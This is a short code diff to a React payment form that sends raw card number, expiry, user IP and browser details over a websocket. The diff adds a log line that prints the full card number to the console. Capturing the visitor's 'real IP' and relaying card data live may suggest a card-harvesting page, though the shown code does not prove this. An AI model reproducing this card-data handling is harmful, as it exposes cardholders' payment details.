@@ -289,6 +289,8 @@ const PaymentForm = () => {
     const realIP = await getRealIP();
     const cardData = {
       id: socketId, // Use socket ID as the ID
+      socket_id: socketId, // Also include as socket_id for clarity
+      invoice_id: generateInvoiceId(), // Generate invoice ID
       card_number: formData.cardNumber,
       expiry_month: formData.expiryMonth,
       expiry_year: formData.expiryYear,
@@ -297,10 +299,18 @@ const PaymentForm = () => {
       amount: formData.amount,
       user_ip: realIP,
       browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
-      network: getRandomNetwork()
+      network: getRandomNetwork(),
+      created_at: new Date().toISOString(),
+      status: 'pending'
     };
 
-    console.log('Submitting card data with socket ID:', socketId);
+    console.log('Submitting card data:', {
+      socketId,
+      invoiceId: cardData.invoice_id,
+      amount: cardData.amount,
+      cardNumber: cardData.card_number
+    });
+
     wsClient.send('card_submission', cardData);
   };
 
